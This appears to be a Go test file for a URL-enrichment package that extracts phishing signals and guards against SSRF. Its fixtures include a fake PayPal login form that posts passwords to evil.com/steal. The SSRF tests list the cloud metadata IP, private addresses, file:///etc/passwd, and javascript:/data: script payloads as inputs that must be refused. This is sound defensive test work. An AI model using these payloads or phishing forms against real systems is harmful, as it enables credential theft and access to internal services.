package enricher

import (
	"context"
	"net"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/require"
)

// allowLoopbackForTest swaps the SSRF dialer predicate so httptest servers
// (which listen on 127.0.0.1) are reachable. Restored on test cleanup.
func allowLoopbackForTest(t *testing.T) {
	t.Helper()
	orig := isPublicIPFn
	isPublicIPFn = func(ip net.IP) bool {
		if ip.IsLoopback() {
			return true
		}
		return orig(ip)
	}
	t.Cleanup(func() { isPublicIPFn = orig })
}

const syntheticHTML = `<html lang="en">
<head><title>PayPal Login</title>
<link rel="icon" href="https://paypal.com/favicon.ico">
</head>
<body>
<form action="https://evil.com/steal">
<input type="password" name="pass">
<input type="hidden" name="redirect" value="/">
</form>
</body>
</html>`

func TestFetchHTTP_Synthetic(t *testing.T) {
	allowLoopbackForTest(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(syntheticHTML))
	}))
	defer srv.Close()

	r := FetchHTTP(context.Background(), srv.URL)

	require.Equal(t, 200, r.StatusCode)
	require.Equal(t, "PayPal Login", r.Title)
	require.Equal(t, "en", r.Language)
	require.Equal(t, "evil.com", r.FormActionDomain)
	require.Contains(t, r.FaviconURL, "paypal.com")
	require.Equal(t, 1, r.PasswordFieldCount)
	require.True(t, r.HasHiddenRedirect)
}

func TestFetchHTTP_Unreachable(t *testing.T) {
	// Loopback intentionally NOT allowed: default SSRF guard blocks the dial.
	t.Parallel()
	r := FetchHTTP(context.Background(), "http://127.0.0.1:19999/no-server-here")
	require.Equal(t, 0, r.StatusCode)
}

// SSRF guards: the default predicate must refuse private/loopback/link-local
// targets without a test override.

func TestFetchHTTP_SSRF_BlocksLoopback(t *testing.T) {
	t.Parallel()
	r := FetchHTTP(context.Background(), "http://127.0.0.1/")
	require.Equal(t, 0, r.StatusCode, "loopback must be blocked")
}

func TestFetchHTTP_SSRF_BlocksMetadataIP(t *testing.T) {
	t.Parallel()
	r := FetchHTTP(context.Background(), "http://169.254.169.254/latest/meta-data/")
	require.Equal(t, 0, r.StatusCode, "cloud metadata IP must be blocked")
}

func TestFetchHTTP_SSRF_BlocksPrivateRFC1918(t *testing.T) {
	t.Parallel()
	for _, raw := range []string{
		"http://10.0.0.1/",
		"http://172.16.0.1/",
		"http://192.168.1.1/",
	} {
		r := FetchHTTP(context.Background(), raw)
		require.Equal(t, 0, r.StatusCode, "private IP must be blocked: %s", raw)
	}
}

func TestFetchHTTP_SSRF_BlocksNonHTTPScheme(t *testing.T) {
	t.Parallel()
	for _, raw := range []string{
		"file:///etc/passwd",
		"gopher://example.com/",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
	} {
		r := FetchHTTP(context.Background(), raw)
		require.Equal(t, 0, r.StatusCode, "scheme must be blocked: %s", raw)
	}
}

func TestIsPublicIP(t *testing.T) {
	t.Parallel()
	cases := []struct {
		ip   string
		want bool
	}{
		{"8.8.8.8", true},
		{"1.1.1.1", true},
		{"127.0.0.1", false},
		{"10.0.0.1", false},
		{"172.16.0.1", false},
		{"192.168.1.1", false},
		{"169.254.169.254", false},
		{"::1", false},
		{"fe80::1", false},
		{"fc00::1", false},
		{"224.0.0.1", false},
		{"0.0.0.0", false},
	}
	for _, tc := range cases {
		require.Equal(t, tc.want, isPublicIP(net.ParseIP(tc.ip)), tc.ip)
	}
}
